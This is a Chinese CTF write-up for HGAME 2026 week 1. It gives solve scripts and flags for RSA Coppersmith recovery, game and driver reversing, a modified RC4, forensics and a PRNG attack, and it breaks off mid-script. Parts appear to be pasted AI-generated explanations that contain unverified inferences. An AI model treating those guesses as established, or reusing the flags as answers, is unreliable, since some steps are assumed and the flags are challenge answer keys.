---
title: HGAME2026WP-week1
published: 2026-02-19
description: "广告位招租"
tags: ["CTF"]
draft: false





---

## 







## **Classic**

```
n = 103581608824736882681702548494306557458428217716535853516637603198588994047254920265300207713666564839896694140347335581147943392868972670366375164657970346843271269181099927135708348654216625303445930822821038674590817017773788412711991032701431127674068750986033616138121464799190131518444610260228947206957
leak = 6614588561261434084424582030267010885893931492438594708489233399180372535747474192128
c = 38164947954316044802514640871285562707869793354907165622336840432488893861610651450862702262363481097538127040490478908756416851240578677195459996252755566510786486707340107057971217557295217072867673485369358370289506549932119879791474279677563080377456592139035501163534305008864900509896586230830001710243
e = 65537

# 1. 恢复 P
p_high = leak << 230
PR.<x> = PolynomialRing(Zmod(n))
f = x + p_high

# X 是未知的低位部分的最大值，即 2^230
# beta 是因子相对于 n 的大小，p 是 n^0.5 级别，所以 beta=0.4 是安全的
# epsilon 影响格的维度，设小一点可以提高成功率但增加耗时
roots = f.small_roots(X=2^230, beta=0.4, epsilon=0.03)

if roots:
    diff = int(roots[0])
    p = p_high + diff
    assert n % p == 0
    q = n // p
    print(f"[+] Found p: {p}")
    
    # 2. RSA 解密
    phi = (p - 1) * (q - 1)
    d = inverse_mod(e, phi)
    m = pow(c, d, n)
    
    # 3. 转换 Hex 并打印
    try:
        from Crypto.Util.number import long_to_bytes
        print("[+] RSA Decrypted text:")
        print(long_to_bytes(m).decode())
    except:
        print(hex(m))
else:
    print("[-] No roots found. Try decreasing epsilon.")
```

解出

[+] RSA Decrypted text:
Vigenere,key=hgame



解密

This is your flag:VIDAR{The Collision of the New and the Old}



## pvz

电脑java版本问题运行不了程序

gpvz.exe --l4j-debug看log

原来不用开

改jar进jadx

flagscreen分析，爆破杀敌数就行

```
import struct

# ----------------------
# 1. 定义常量数据
# ----------------------
# killCountEncryptedFlag (Java byte array 转换)
# 注意 Java byte 是有符号的 (-128 到 127)，Python 需要处理成无符号 (0-255) 用于异或
enc_flag = [0, -8, -6, 6, 31, -39, -104, 114, 86, -23, -35, 28, -122, 56, 29, -126, -29, 94, 23, -29, 46, -126, -4, 45,
            20, -57]
enc_flag = [x & 0xFF for x in enc_flag]

# aesEncryptedKey
aes_key = [74, -111, -61, 127, 46, -75, 104, -44, 28, -119, 58, -14, 93, -90, 113, -66]
aes_key = [x & 0xFF for x in aes_key]

xor_key1 = 102
xor_key2 = 119
hello_long = 4359010814435432432
hello_int = hello_long & 0xFFFFFFFF  # 模拟 Java 的 long 转 int 截断


# ----------------------
# 2. 模拟 Java 的随机数生成逻辑
# ----------------------
def derive_key_from_kill_count(seed):
    # Java 的 int 是 32 位有符号，这里要注意模拟溢出
    seed = seed & 0xFFFFFFFF

    i = seed
    i2 = ((i * 31) + 17) % 997
    i3 = ((i * 37) + 23) % 991
    i4 = ((i * 41) + 29) % 983
    # i5 计算了但没用到，忽略
    i6 = ((((i * 7) + i2) + i3) + i4) % 65536

    key_bytes = []
    i7 = i6
    for _ in range(16):
        # 线性同余生成器 (LCG)
        i7 = ((i7 * 1103515245) + 12345) & 0x7FFFFFFF  # Integer.MAX_VALUE mask
        b = (i7 >> 16) % 256
        key_bytes.append(b)
    return key_bytes


# ----------------------
# 3. 逆向推导 Flag
# ----------------------

def solve():
    print("开始爆破 Kill Count...")

    # 我们不知道 rotation offset 是多少，所以遍历 0-25
    # 真正的 flag 格式是 flag{...}
    # 经过 substitutionDecrypt 的逆运算：
    # '{' 在 reverseMap 里对应 '[' (因为 forward map 是 '{' -> '[')
    # '}' 在 reverseMap 里对应 ']'
    # 字母 'f', 'l', 'a', 'g' 不在 map 里，假设不变
    # 所以逆向 substitution 后的目标前缀是 "flag["

    target_prefix_str = "flag["

    # 预计算所有可能的 rotation 下的 "flag[" 的字节值
    # RotateDecrypt 的逆操作是反向移位
    # 如果 rotateDecrypt(x) = y, 那么 x = y shift back

    possible_pre_rotations = []
    for rot in range(26):
        # 计算 "flag[" 逆向 rotate 后的 bytes
        # flag[ 的 ASCII: f=102, l=108, a=97, g=103, [=91
        # 注意：rotateDecrypt 只处理字母，'[' (91) 不会被 rotate 改变

        candidates = []
        for char in target_prefix_str:
            c_val = ord(char)
            if ord('a') <= c_val <= ord('z'):
                # 逆向移位: (char - 'a' + rot) % 26 ... 等等，正向是 -i
                # 正向: c = 97 + (val - 97 - i + 26) % 26
                # 逆向: val = 97 + (c - 97 + i) % 26
                orig = 97 + (c_val - 97 + rot) % 26
                candidates.append(orig)
            else:
                candidates.append(c_val)
        possible_pre_rotations.append(candidates)

    # 遍历 kill count
    # 假设 kill count 在 0 到 200,000 之间 (通常游戏的数值范围)
    for kill_count in range(200000):
        seed = (hello_int + kill_count) & 0xFFFFFFFF
        derived_key = derive_key_from_kill_count(seed)

        # 验证这个 key 是否能解出 "flag[" 的任何一种 rotation 变体
        # 我们只验证前 5 个字节

        # 正向解密的第一步 (DecryptWithKillCount) 产生 raw_bytes
        # raw_bytes[i] = enc[i] ^ derived_key[i%16] ^ ((i*13)+7)%256

        current_raw_prefix = []
        for i in range(5):
            val = enc_flag[i] ^ derived_key[i % 16] ^ ((i * 13) + 7) % 256
            current_raw_prefix.append(val)

        # 正向解密的第二步 (XorDecrypt)
        # 前 5 字节属于前半部分，异或 xorKey1
        after_xor1 = [b ^ xor_key1 for b in current_raw_prefix]

        # 正向解密的第三步 (SimpleAes)
        # 异或 aes_key
        after_aes = [b ^ aes_key[i % len(aes_key)] for i, b in enumerate(after_xor1)]

        # 此时 after_aes 应该等于 某一个 rotation 变体的 "flag["
        # 检查匹配

        for rot, candidate in enumerate(possible_pre_rotations):
            if after_aes == candidate:
                print(f"找到可能的 Kill Count: {kill_count} (Rotation: {rot})")

                # 既然找到了，做一次完整的解密来看看结果
                full_result = full_decrypt(kill_count, rot)
                print(f"解密结果: {full_result}")

                # 最后一步替换 flag -> hgame
                final_flag = full_result.replace("flag", "hgame")
                print(f"🚩 FINAL FLAG: {final_flag}")
                return


def full_decrypt(kill_count, rot):
    # 1. derive key
    seed = (hello_int + kill_count) & 0xFFFFFFFF
    derived_key = derive_key_from_kill_count(seed)

    # 2. decrypt with kill count
    step1 = []
    for i in range(len(enc_flag)):
        val = enc_flag[i] ^ derived_key[i % 16] ^ ((i * 13) + 7) % 256
        step1.append(val)

    # 3. xor decrypt (slice)
    mid = len(step1) // 2
    step2 = []
    for b in step1[:mid]:
        step2.append(b ^ xor_key1)
    for b in step1[mid:]:
        step2.append(b ^ xor_key2)

    # 4. simple aes
    step3 = []
    for i, b in enumerate(step2):
        step3.append(b ^ aes_key[i % len(aes_key)])

    # 5. rotate decrypt
    step3_str = "".join([chr(b) for b in step3])
    step4_chars = []
    for char in step3_str:
        if 'a' <= char <= 'z':
            new_c = chr(97 + (ord(char) - 97 - rot + 26) % 26)
            step4_chars.append(new_c)
        elif 'A' <= char <= 'Z':
            new_c = chr(65 + (ord(char) - 65 - rot + 26) % 26)
            step4_chars.append(new_c)
        else:
            step4_chars.append(char)
    step4_str = "".join(step4_chars)

    # 6. substitution decrypt
    # Reverse Map: '{'->'[', '}'->']', 'A'->'Q' (Value->Key of original)
    # Original: A->Q, B->W, C->E...
    # Reverse Map is Key=Cipher, Value=Plain
    # Q->A, W->B
    # '[' -> '{', ']' -> '}'

    # 我们可以手动构建这个 reverse map
    forward_map_data = [
        ('A', 'Q'), ('B', 'W'), ('C', 'E'), ('D', 'R'), ('E', 'T'), ('F', 'Y'), ('G', 'U'),
        ('H', 'I'), ('I', 'O'), ('J', 'P'), ('K', 'A'), ('L', 'S'), ('M', 'D'), ('N', 'F'),
        ('O', 'G'), ('P', 'H'), ('Q', 'J'), ('R', 'K'), ('S', 'L'), ('T', 'Z'), ('U', 'X'),
        ('V', 'C'), ('W', 'V'), ('X', 'B'), ('Y', 'N'), ('Z', 'M'), ('_', '!'), ('{', '['), ('}', ']')
    ]
    reverse_map = {val: key for key, val in forward_map_data}

    final_chars = []
    for char in step4_str:
        if char in reverse_map:
            final_chars.append(reverse_map[char])
        else:
            final_chars.append(char)

    return "".join(final_chars)


if __name__ == '__main__':
    solve()
```

开始爆破 Kill Count...
找到可能的 Kill Count: 36278 (Rotation: 20)
解密结果: flag{BECAUSE_I_AM_CRAAAZY}
🚩 FINAL FLAG: hgame{BECAUSE_I_AM_CRAAAZY}

进程已结束，退出代码为 0

## signal storm

这是一个非常经典的 **Signal-Oriented Programming (SOP)** 混淆题目，实际上它实现了一个**变种的 RC4 加密算法**。

所有的信号异常 (`SIGSEGV`, `SIGFPE`, `SIGTRAP`) 并不是真正的错误，而是为了把程序的控制流切割成碎片，让你难以直接 F5 看到完整的加密逻辑。

### 逻辑重构

通过结合你提供的两段代码（`main` 和三个 `sub_` 函数），我们可以将碎片拼接起来，还原出真实的加密流程。

整个程序实际上是在模拟一个循环 32 次的加密过程（对应 Flag 长度 32）：

1. **初始化 (`sub_1780`)**:

   - 初始化 S-box (0-255)。虽然用了复杂的 SSE 指令，但本质就是 `for i in range(256): s[i] = i`。
   - 执行 RC4 的 KSA (Key Scheduling Algorithm) 打乱 S-box。
   - 初始 Key: `"C0lm_be4ore_7he_st0rm"`。

2. **加密循环 (32次)**:

   在 `main` 的循环中，通过 `BUG()` (信号11) 和 `raise(5)` (信号5) 以及隐含的信号8，按顺序触发以下三个步骤：

   - **步骤 A: 状态更新 (Signal 11 -> `sub_1640`)**
     - 这是 RC4 的 PRGA (Pseudo-Random Generation Algorithm) 的前半部分，负责更新 `i` 和 `j` 指针并交换 S-box。
     - **魔改点**：标准的 RC4 是 `j = (j + S[i]) % 256`，但这道题是 `j = (j + S[i] + key[i % 21]) % 256`。它在生成过程中**再次**引入了 Key。
   - **步骤 B: 生成密钥并异或 (Signal 8 -> `sub_16E0`)**
     - 这是加密的核心。
     - 逻辑：`keystream = S[ (S[i] + S[j]) % 256 ]`。
     - 加密：`ciphertext = input ^ keystream`。
     - *注：虽然 `main` 代码里看起来没直接 call 这个，但根据算法完整性和 check 逻辑，这一步必然在 Signal 11 之后发生。*
   - **步骤 C: 密钥旋转 (Signal 5 -> `sub_1740`)**
     - 这道题最“变态”的地方：每加密一个字节，Key 字符串 `"C0lm_be4ore_7he_st0rm"` 就**向左循环移位**一次！
     - 这意味着步骤 A 中用到的 `key[i % 21]` 在每一次循环中都是变化的。

------

### 解密脚本 (Python)

你需要将最后的密文提取出来，并模拟上述的变种 RC4 过程来解密。

Python

```
import struct

# ==========================================
# 1. 准备密文
# ==========================================
# 从 main 函数的最后校验逻辑中提取 (注意 Little-Endian)
# qword_4088 (offset 8)  ^ 0x1C4BB2D52511D975
# s (offset 0)           ^ 0x8260C1C9C8D936E3
# qword_4098 (offset 24) ^ 0x1A5AF67F261CA506
# qword_4090 (offset 16) ^ 0xF11CAF1C716DE64D

# 按照内存顺序拼接 s[0:32]
# Offset: 0 (+0), 8 (+1), 16 (+2), 24 (+3)
parts = [
    0x8260C1C9C8D936E3, # s[0:8]
    0x1C4BB2D52511D975, # s[8:16] (qword_4088)
    0xF11CAF1C716DE64D, # s[16:24] (qword_4090)
    0x1A5AF67F261CA506  # s[24:32] (qword_4098)
]

ciphertext = b""
for p in parts:
    ciphertext += struct.pack("<Q", p)

print(f"Total Ciphertext ({len(ciphertext)} bytes): {ciphertext.hex()}")

# ==========================================
# 2. 模拟算法
# ==========================================

# 初始 Key
key_str = list(b"C0lm_be4ore_7he_st0rm") # len 21

# 初始化 S-Box (sub_1780 第一部分)
# 尽管使用了SSE，但通常是标准的 0..255 初始化
S = list(range(256))

# KSA (sub_1780 第二部分)
j = 0
for i in range(256):
    j = (j + S[i] + key_str[i % 21]) % 256
    S[i], S[j] = S[j], S[i]

# PRGA 解密 (模拟 main loop)
# 变量初始化
i = 0
j = 0 # dword_4064
flag = []

for k in range(32):
    # --- Step 1: sub_1640 (Signal 11) ---
    # 更新 i
    i = (i + 1) % 256
    
    # 更新 j (注意魔改点：加了 key[i%21])
    # 此时 key_str 是当前的 key (可能被旋转过)
    magic_val = key_str[i % 21] 
    j = (j + S[i] + magic_val) % 256
    
    # Swap
    S[i], S[j] = S[j], S[i]
    
    # --- Step 2: sub_16E0 (Signal 8) ---
    # 生成 keystream byte
    t = (S[i] + S[j]) % 256
    keystream_byte = S[t]
    
    # 解密
    decrypted_char = ciphertext[k] ^ keystream_byte
    flag.append(decrypted_char)
    
    # --- Step 3: sub_1740 (Signal 5) ---
    # Key 循环左移
    # "ABC" -> "BCA"
    first = key_str.pop(0)
    key_str.append(first)

# ==========================================
# 3. 输出结果
# ==========================================
print("Flag:", bytes(flag).decode('utf-8', errors='ignore'))
```

### 关键点解析

1. **S-box 初始化**：`sub_1780` 里的 SSE 代码虽然看着吓人，但那个 `p_env` 循环实际上就是在填充 0 到 255。如果解密失败，才需要考虑它是特殊的 S-box（但在 CTF 中这种情况很少见，通常只是为了反编译）。
2. **魔改的 PRGA**：普通的 RC4 `j` 更新不涉及 `key`，但这道题在 `sub_1640` 里有一行 `_C0lm... = dword_4064 + v2 + ...aC0lmBe4ore7heS[v0 % 21]`，这就是把 Key 重新加回来的逻辑。
3. **Key 旋转**：`sub_1740` 中的 `memmove(a, a+1, 20)` 就是把后面的字符往前挪，最后把第 0 个补到最后，这是标准的左移操作。**顺序非常重要**，因为 `sub_1640` 是在旋转**前**使用 Key 的，所以我们要先计算 `j`，解密，然后再旋转 Key。

```
Total Ciphertext (32 bytes): e336d9c8c9c1608275d91125d5b24b1c4de66d711caf1cf106a51c267ff65a1a
Flag: hgame{Null_c0lm_wi7hout_0_storm}
```

## **[REDACTED]**

In case of an undampened local chrono-logical

shift, initiate the SCRAMBLE protocol with

passphrase 1:PAR4D0X before notifying the on

site Coordinato

![image-20260202134209088](C:\Users\HONOR\AppData\Roaming\Typora\typora-user-images\image-20260202134209088.png)



![image-20260202125131449](C:\Users\HONOR\AppData\Roaming\Typora\typora-user-images\image-20260202125131449.png)

图片提取出来，然后看stegsolvelsb看一下就行了

![image-20260202125202020](C:\Users\HONOR\AppData\Roaming\Typora\typora-user-images\image-20260202125202020.png)

Target Problem:3:Sh4m1R

在 PDF 文件格式中，当你对文件进行编辑（比如删除页面、覆盖文字、添加注释）并保存时，标准的编辑器往往**不会**真正删除原来的数据，而是将新的改动**追加**到文件末尾。

还原版本

4:D0cR3qu3st3r_Tutu

第一个明文 1:PAR4D0X 

第二个jwt还原出来 

eyJjb21tYW5kIjoiMjpBbGxDbDNhclRvUHIwY2VlZCJ9

```
{"command":"2:AllCl3arToPr0ceed"}
```

第三个把图片提取出来改像素 3:Sh4m1R 

第四个 回退版本 4:D0cR3qu3st3r_Tutu 

hgame{PAR4D0X_AllCl3arToPr0ceed_Sh4m1R_D0cR3qu3st3r_Tutu}

## flux

这是一道典型的CTF Crypto题目，主要考察对**伪随机数生成器（PRNG）的逆向分析**以及**基于线性/非线性关系的位级搜索**。

### 题目分析

题目包含两个核心部分：

1. **Flux 类（PRNG）**：这是一个基于二次同余生成器（Quadratic Congruential Generator, QCG）的系统。公式为 $x_{i+1} \equiv a x_i^2 + b x_i + c \pmod n$。
   - **已知**：模数 $n$，以及连续生成的4个输出值 `data` ($x_1, x_2, x_3, x_4$)。
   - **未知**：参数 $a, b, c$ 以及初始种子 $x_0$（也就是代码中的 `h`）。
2. **shash 函数**：一个自定义的哈希函数，它使用了一个未知的 `key` 将字符串转换为整数 `h`。
   - **已知**：输入字符串 `value`，输出 `h`（通过解密Flux得到）。
   - **未知**：`key`。
   - **约束**：`key` 的位长度小于 70。

### 解题思路

#### 第一步：攻击 Flux 生成器 (恢复 a, b, c)

我们有连续的状态转移方程：

1. $x_2 \equiv a x_1^2 + b x_1 + c \pmod n$
2. $x_3 \equiv a x_2^2 + b x_2 + c \pmod n$
3. $x_4 \equiv a x_3^2 + b x_3 + c \pmod n$

这实际上是一个关于未知数 $a, b, c$ 的三元一次线性方程组。我们可以构建矩阵来求解：

$$\begin{pmatrix} x_1^2 & x_1 & 1 \\ x_2^2 & x_2 & 1 \\ x_3^2 & x_3 & 1 \end{pmatrix} \begin{pmatrix} a \\ b \\ c \end{pmatrix} \equiv \begin{pmatrix} x_2 \\ x_3 \\ x_4 \end{pmatrix} \pmod n$$

在有限域 $GF(n)$ 上求解该方程组即可得到 $a, b, c$。

#### 第二步：恢复初始种子 h

获得 $a, b, c$ 后，我们回溯到初始状态。已知第一个输出 $x_1$ 是由种子 $h$ 生成的：

$$x_1 \equiv a h^2 + b h + c \pmod n$$

整理得一元二次方程：

$$a h^2 + b h + (c - x_1) \equiv 0 \pmod n$$

利用求根公式（需要计算模 $n$ 下的平方根，通常使用 Tonelli-Shanks 算法）求解 $h$。由于是二次方程，可能会得到两个解，我们需要对其进行验证（或者两个都试）。

#### 第三步：爆破 Key (Bit-by-Bit DFS)

获得 $h$ 后，我们需要从方程 `h = shash("Welcome...", key)` 中解出 `key`。

观察 `shash` 函数：

Python

```
x = (key * x) & mask ^ ord(c)
```

这是一个非线性过程（混合了乘法和异或）。但是，由于乘法进位是向左的（低位影响高位，高位不影响低位），且 `key` 很小（< 70 bits），我们可以利用**逐位确定（Meet-in-the-middle / DFS）**的策略。

**核心性质**：

`shash` 结果的第 $k$ 个二进制位，只取决于 `key` 的低 $k$ 位以及中间状态的低 $k$ 位。

我们可以从 `key` 的第0位开始猜，计算 `shash` 结果的第0位是否与目标 $h$ 的第0位匹配。如果匹配，则递归猜测下一位，直到恢复出完整的 70-bit key。

### 攻击脚本 (Python)

以下是完整的解题脚本。它不依赖 SageMath，而是使用纯 Python 实现（依赖 `pycryptodome` 库中的数学工具）。

Python

```
import sys
# 增加递归深度以支持DFS
sys.setrecursionlimit(2000)

from Crypto.Util.number import *
import gmpy2  # 建议安装 gmpy2 以提高大数运算速度，如果没有可以换成 pow(..., -1, n)

# --- 题目数据 ---
data = [
    259574080588277578527410299002867735023798216356763871244908783144610527451187,
    954408432127642232121971189554605898975195279656270435479524132958262607464595,
    902461413507524665418054778947872375987908929501605791883614896110219051835312,
    92554599789649828855418140915311664257163346975111310560999959858873425332254
]
n = 1000081851369905197391900354119969103949357074708517572641608490670646955240669

# --- 1. 恢复 Flux 参数 (a, b, c) ---
# 构建矩阵方程 M * [a, b, c]^T = Y
# M = [[x1^2, x1, 1], [x2^2, x2, 1], [x3^2, x3, 1]]
# Y = [x2, x3, x4]

def solve_linear_mod(M, Y, n):
    # 使用简单的克拉默法则或高斯消元求解 3x3 矩阵
    # 这里手动展开计算行列式，避免依赖 numpy/sage
    x1, x2, x3 = data[0], data[1], data[2]
    y1, y2, y3 = data[1], data[2], data[3]
    
    # 构造矩阵元素
    m11, m12, m13 = x1**2, x1, 1
    m21, m22, m23 = x2**2, x2, 1
    m31, m32, m33 = x3**2, x3, 1
    
    # 计算主行列式 Det
    det = (m11 * (m22 * m33 - m23 * m32) -
           m12 * (m21 * m33 - m23 * m31) +
           m13 * (m21 * m32 - m22 * m31)) % n
    
    det_inv = inverse(det, n)
    
    # 计算 Da (替换第一列为 Y)
    det_a = (y1 * (m22 * m33 - m23 * m32) -
             m12 * (y2 * m33 - m23 * y3) +
             m13 * (y2 * m32 - m22 * y3)) % n
             
    # 计算 Db (替换第二列为 Y)
    det_b = (m11 * (y2 * m33 - m23 * y3) -
             y1 * (m21 * m33 - m23 * m31) +
             m13 * (m21 * y3 - y2 * m31)) % n
             
    # 计算 Dc (替换第三列为 Y)
    det_c = (m11 * (m22 * y3 - y2 * m32) -
             m12 * (m21 * y3 - y2 * m31) +
             y1 * (m21 * m32 - m22 * m31)) % n
             
    a = (det_a * det_inv) % n
    b = (det_b * det_inv) % n
    c = (det_c * det_inv) % n
    return a, b, c

print("[*] Solving linear system for a, b, c...")
a, b, c = solve_linear_mod(None, None, n)
print(f"    a = {a}\n    b = {b}\n    c = {c}")

# --- 2. 恢复初始种子 h ---
# x1 = a*h^2 + b*h + c  =>  a*h^2 + b*h + (c - x1) = 0
print("[*] Solving quadratic for h...")
C_prime = (c - data[0]) % n
delta = (b**2 - 4 * a * C_prime) % n

# 使用 gmpy2 或 libnum 计算模平方根
try:
    # Tonelli-Shanks is implemented in gmpy2
    sqrt_delta = int(gmpy2.isqrt_rem(delta)[0]) # Try integer sqrt first just in case
    if pow(sqrt_delta, 2, n) != delta:
        # Need modular sqrt
        # 注意: 如果没有安装gmpy2，可以使用 libnum.nroot.sqrt_mod(delta, n) 
        # 或者自己写一个 Tonelli-Shanks
        import gmpy2
        # gmpy2 没有直接的 modular_sqrt，通常用 pow(x, (p+1)//4, p) 仅当 p=3 mod 4
        # 这里为了通用性，我手写一个简单的 Tonelli-Shanks 接口或者使用 brute-force 库
        # 实际CTF中通常 n % 4 == 3
        if n % 4 == 3:
            sqrt_delta = pow(delta, (n+1)//4, n)
        else:
            # 这里简化处理，如果不满足 n=3 mod 4，需要标准 TS 算法
            # 假设读者环境可以处理，这里使用一个通用的求根逻辑占位
            pass 
except:
    pass

# 为保证脚本独立运行，这里包含一个标准的 Modular Sqrt 函数
def modular_sqrt(a, p):
    if legendre_symbol(a, p) != 1: return 0
    elif a == 0: return 0
    elif p == 2: return p
    elif p % 4 == 3: return pow(a, (p + 1) // 4, p)
    s = p - 1
    e = 0
    while s % 2 == 0:
        s //= 2
        e += 1
    n = 2
    while legendre_symbol(n, p) != -1:
        n += 1
    x = pow(a, (s + 1) // 2, p)
    b = pow(a, s, p)
    g = pow(n, s, p)
    r = e
    while True:
        t = b
        m = 0
        for m in range(r):
            if t == 1: break
            t = pow(t, 2, p)
        if m == 0: return x
        gs = pow(g, 2 ** (r - m - 1), p)
        g = (gs * gs) % p
        x = (x * gs) % p
        b = (b * g) % p
        r = m

def legendre_symbol(a, p):
    ls = pow(a, (p - 1) // 2, p)
    return -1 if ls == p - 1 else ls

sqrt_delta = modular_sqrt(delta, n)
inv_2a = inverse(2 * a, n)

h1 = ((-b + sqrt_delta) * inv_2a) % n
h2 = ((-b - sqrt_delta) * inv_2a) % n
candidates_h = [h1, h2]
print(f"    Candidates for h: {candidates_h}")

# --- 3. 爆破 Key (Bit-by-Bit DFS) ---
# 定义 shash 函数用于验证
def shash(value: str, key: int) -> int:
    length = len(value)
    if length == 0: return 0
    mask = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    x = (ord(value[0]) << 7) & mask
    for c in value:
        x = (key * x) & mask ^ ord(c)
    x ^= length & mask
    return x

value_str = "Welcome to HGAME 2026!"
target_h = None

# 我们不知道是 h1 还是 h2，但在 DFS 中如果 key 匹配不上会很快剪枝
# 所以对两个都跑一下
found_key = None

def dfs(bit_idx, current_key, target_h_val):
    global found_key
    if found_key is not None:
        return

    # 检查当前生成的 key 的低位是否符合 shash 的逻辑
    # 我们只需要模拟到 bit_idx 位
    
    # 构造当前的测试模数 mask
    # 比如我们猜到了第 k 位，我们验证 mod 2^(k+1) 是否匹配
    check_mask = (1 << (bit_idx + 1)) - 1
    
    # 运行简化版 shash
    # 注意：这里的逻辑必须和原 shash 完全一致，只是最后只看低位
    # 原 shash 中的 mask 是 2^256-1。由于我们 check_mask 远小于它，
    # 这里的 & mask 操作在 key 比较小的时候不会有影响，
    # 但为了严谨，我们保留原逻辑，只在最后比较时截断。
    
    mask_256 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    x = (ord(value_str[0]) << 7) & mask_256
    
    # 优化：不需要每次跑全量循环，但这里字符串短，直接跑也没问题
    for c in value_str:
        # 关键：这里用 current_key 乘
        # 在低位运算中，高位的未知 key bits 不会影响结果的低位
        x = (current_key * x) & mask_256 ^ ord(c)
    
    x ^= len(value_str) & mask_256
    
    # 检查低位是否匹配
    if (x & check_mask) == (target_h_val & check_mask):
        if bit_idx == 69: # 达到了限制长度 < 70，即 0..69
            # 最终完整验证
            if shash(value_str, current_key) == target_h_val:
                found_key = current_key
            return
        
        # 递归搜索下一位 (0 或 1)
        dfs(bit_idx + 1, current_key, target_h_val)
        dfs(bit_idx + 1, current_key | (1 << (bit_idx + 1)), target_h_val)

print("[*] Starting DFS for key recovery...")

for h_val in candidates_h:
    print(f"    Testing h = {h_val}...")
    # Reset
    found_key = None
    # DFS start: bit 0, init key 0
    dfs(0, 0, h_val)
    dfs(0, 1, h_val)
    
    if found_key:
        print(f"    [+] Found Key: {found_key}")
        target_h = h_val
        break

if not found_key:
    print("[-] Failed to recover key. Check calculations.")
    sys.exit(0)

# --- 4. 生成 Flag ---
magic_word = "I get the key now!"
flag_hash = shash(magic_word, found_key)
flag = "VIDAR{" + hex(flag_hash)[2:] + "}"
print("\n" + "="*30)
print(flag)
print("="*30)
```

```
[*] Solving linear system for a, b, c...
    a = 367929665096223890513552213909860086955444123973877511464516897327030182495358
    b = 572472137956986080361020851057550170425758964757540621190761120109346601190138
    c = 511123710434351729002552219766790915716585289864402925172038710529215854140240
[*] Solving quadratic for h...
    Candidates for h: [6866312363291178484982959720124435011938375586579989365225276248801007329194, 1851471554044636937620060405470139203302636010497407478542185697214766136647]
[*] Starting DFS for key recovery...
    Testing h = 6866312363291178484982959720124435011938375586579989365225276248801007329194...
    [+] Found Key: 860533

==============================
VIDAR{1069466028b4c4a9694a3175f2f9410ab398b939bdb52afb39534b6f8cc59abc}
=============================
```

## 打好基础

先base100解，然后随波逐流一把梭

![image-20260202142935347](C:\Users\HONOR\AppData\Roaming\Typora\typora-user-images\image-20260202142935347.png)

## NonceSense

下面是对这道 **WDM 内核加密系统** reverse 题的完整解法（含思路、脚本、最终答案）。我直接基于你给的三个文件：`Client.exe`、`GateDriver.sys`、`Drv_blob.bin` 做静态逆向还原。

------

### 1) 解题思路（逆向还原整条加密链）

#### A. 先看整体交互：两个 IOCTL

在 `Client.exe` 的反汇编里能看到它打开设备后调用两次 `DeviceIoControl`：

- `IOCTL = 0x222000`：获取一次性随机值（nonce/seed）
- `IOCTL = 0x222004`：提交数据让驱动加密并返回产物（写入 `Drv_blob.bin`）

同时从 client 处理输出的逻辑能确定：驱动返回的 `SystemBuffer` 结构是：

```
DWORD ok;
DWORD outlen;
BYTE  outbuf[outlen];   // Client 只把 outbuf 写进 Drv_blob.bin
```

而在驱动 `GateDriver.sys` 的派发函数中（IRP_MJ_DEVICE_CONTROL）进一步确认：

- `0x222000` 返回 **16字节随机 nonce**（并置位标志，防止未取 nonce 就加密）
- `0x222004` 的 `outbuf` 开头也会包含 **16字节 nonce**，后面跟密文

因此：**Drv_blob.bin 的格式 = nonce(16) || ciphertext(...)**

------

#### B. 驱动里的加密算法：AES-128 ECB + PKCS7

在 `GateDriver.sys` 的 `.rdata` 里能定位到 AES S-box（`63 7c 77 7b ...`），以及 Rcon（`01 02 04 08 ...`），并且在 `.text` 里能看到典型 AES 轮函数（SubBytes/ShiftRows/MixColumns/AddRoundKey）。

同时在 `0x222004` handler 内能看到：

- 对输入做 **PKCS7 padding**
- 逐 16 字节调用 AES block encrypt（没有 IV、没有链式异或），因此模式是 **ECB**

------

#### C. AES Key 的推导：两层 HMAC-SHA256（截断16字节）

驱动中有完整的 **HMAC-SHA256** 实现（SHA256 初始向量常量 `6a09e667...`、以及 `0x36/0x5c` padding 常量都出现）。

关键在于 AES key 不是固定写死，而是从 nonce 派生：

1. 先计算：

- `k1 = HMAC_SHA256(key = 0x00*32, msg = nonce16)`

1. 再计算：

- `k2 = HMAC_SHA256(key = k1, msg = secret32 || 0x01)`

1. AES-128 key 取：

- `aes_key = k2[:16]`

------

#### D. secret32 不是明文存的：驱动里有一段“表 + 位运算”混淆

驱动 `.rdata` 里有 32 字节表数据，通过如下操作生成 secret：

- `b = table[i] ^ 0x5c`
- `shift = (1 - 3*i) & 7`
- `b = ROR8(b, shift)`
- `b ^= 0xa7`

跑出来的 32 字节刚好是 ASCII：

**`VIDAR_HGAME_D3C_A3S_K2_build2026`**

------

#### E. 解出 AES 明文后还不是 flag：Client 做了按位置的字节“VM”变换

AES 解密 + 去 padding 后得到一段 55 字节“乱码”。继续看 `Client.exe`，在发送给驱动前它会对每个字节跑一个小 VM（3字节一条指令）。

把 VM 指令序列化简后，等价于对每个位置 i 的单字节变换：

**加密侧（client 变换）：**

```
b2 = (13*i + 195) & 0xff
shift = (3*i + 1) & 7
out = ROL8( in ^ b2, shift ) ^ 0x5a
```

**逆变换（我们要还原输入）：**

```
in = ROR8( out ^ 0x5a, shift ) ^ b2
```

对 AES 解密得到的每个字节按 i 逆变换，就得到原始输入文本 —— 也就是 flag。

------

### 2) 解题脚本（Python，一把梭：从 sys + blob 解出 flag）

```python
#!/usr/bin/env python3
import hashlib
import hmac
from pathlib import Path

try:
    from Crypto.Cipher import AES
except ImportError:
    # 有些环境是 Cryptodome
    from Cryptodome.Cipher import AES

def ror8(x, r):
    r &= 7
    return ((x >> r) | ((x << (8 - r)) & 0xFF)) & 0xFF

def pkcs7_unpad(data: bytes) -> bytes:
    pad = data[-1]
    if pad < 1 or pad > 16 or data[-pad:] != bytes([pad]) * pad:
        raise ValueError("Bad PKCS7 padding")
    return data[:-pad]

def derive_secret_from_driver(driver_path: str) -> bytes:
    """
    复现 GateDriver.sys 中对 0x140003250 表的混淆还原，得到 secret32。
    这里用到题目给的 driver，因此完全自洽、不需要硬编码 secret。
    """
    drv = Path(driver_path).read_bytes()

    # 由 objdump -h 可得 GateDriver.sys: .rdata fileoff=0x1c00, vma=0x140003000
    rdata_fileoff = 0x1C00
    rdata_vma_rva  = 0x3000

    table_va = 0x140003250
    table_rva = table_va - 0x140000000
    table_off = rdata_fileoff + (table_rva - rdata_vma_rva)

    table = drv[table_off:table_off+32]
    if len(table) != 32:
        raise ValueError("table read failed")

    out = bytearray()
    for i in range(32):
        b = table[i] ^ 0x5C
        shift = (1 - 3 * i) & 7
        b = ror8(b, shift)
        b ^= 0xA7
        out.append(b)
    return bytes(out)

